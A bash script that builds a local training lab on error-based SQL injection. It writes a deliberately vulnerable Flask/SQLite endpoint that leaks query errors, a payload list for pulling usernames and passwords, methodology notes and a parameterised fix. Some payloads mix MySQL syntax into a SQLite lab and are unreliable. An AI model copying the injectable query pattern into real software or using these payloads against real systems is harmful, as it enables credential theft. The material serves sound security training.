#!/usr/bin/env bash

set -e

BASE="/home/karime/portswigger_labs/sqli/02-error-based/01-error-based-leak"

echo "[+] Building ERROR-BASED SQLi lab..."
echo "    $BASE"

mkdir -p "$BASE"/{vuln,exploit,notes,fix,payloads,automation,db,reports}

# ============================================================
# README
# ============================================================

cat > "$BASE/README.md" << 'EOF'
# 05 — Error-Based SQL Injection

## Objective
Extract data through database error messages.

## Core idea
Force SQL errors that reveal internal data.

## Why this matters
- UNION blocked → fallback technique
- Blind too slow → error-based faster
- Misconfigured production apps leak stack traces
EOF

# ============================================================
# VULNERABLE APP (INTENTIONAL ERROR LEAKAGE)
# ============================================================

cat > "$BASE/vuln/vuln.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/product")
def product():

    pid = request.args.get("id", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    # Vulnerable query with no sanitization
    query = f"SELECT name, price FROM products WHERE id = {pid}"

    print("[SQL]", query)

    try:
        result = cur.execute(query).fetchall()
        return {"result": result}

    except Exception as e:
        # ❌ ERROR LEAKAGE (real-world misconfig)
        return {
            "error": str(e),
            "query": query
        }

if __name__ == "__main__":
    app.run(debug=True)
EOF

# ============================================================
# EXPLOIT PAYLOADS
# ============================================================

cat > "$BASE/exploit/payloads.txt" << 'EOF'
# BASIC ERROR TRIGGERS

1'          -- type mismatch error
1"          -- syntax error
1)          -- broken expression

# FORCED ERROR WITH DATA LEAK

1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT('X', (SELECT username FROM users LIMIT 1), 'X')))

# SQLITE ERROR-BASED EXTRACTION

1 AND (SELECT CASE WHEN (1=1) THEN load_extension('') END)

# DIVIDE BY ZERO ERROR TRICK

1 AND (SELECT 1/(SELECT COUNT(*) FROM users))

# STRING CONCAT ERROR LEAK

1 AND (SELECT hex(username || ':' || password) FROM users LIMIT 1)
EOF

# ============================================================
# METHODOLOGY
# ============================================================

cat > "$BASE/notes/methodology.txt" << 'EOF'
ERROR-BASED SQLi FLOW

STEP 1 — Force syntax error
' or 1=1--

STEP 2 — Observe DB error response

STEP 3 — Inject subquery inside error context

STEP 4 — Extract data via:
- CONCAT
- CAST
- mathematical errors
- type mismatches

STEP 5 — Iterate extraction
EOF

# ============================================================
# REAL WORLD NOTES
# ============================================================

cat > "$BASE/notes/real_world.txt" << 'EOF'
WHERE THIS OCCURS

- debug mode enabled APIs
- misconfigured PHP apps
- legacy CMS systems
- internal admin panels

COMMON BUG:
"show_errors = true" in production
EOF

# ============================================================
# IMPACT
# ============================================================

cat > "$BASE/notes/impact.txt" << 'EOF'
IMPACT

- credential leakage via error messages
- internal schema exposure
- database fingerprinting
- full data exfiltration via error channels

SEVERITY: HIGH → CRITICAL
EOF

# ============================================================
# FIX
# ============================================================

cat > "$BASE/fix/fix.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/product")
def product():

    pid = request.args.get("id", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    query = "SELECT name, price FROM products WHERE id = ?"

    try:
        result = cur.execute(query, (pid,)).fetchall()
        return {"result": result}

    except Exception:
        # ❌ NO ERROR LEAKAGE
        return {"error": "Internal Server Error"}, 500
EOF

# ============================================================
# DB CONTEXT
# ============================================================

cat > "$BASE/db/schema.txt" << 'EOF'
TABLE users:
- id
- username
- password

TABLE products:
- id
- name
- price
EOF

echo "[+] ERROR-BASED SQLi lab created successfully"
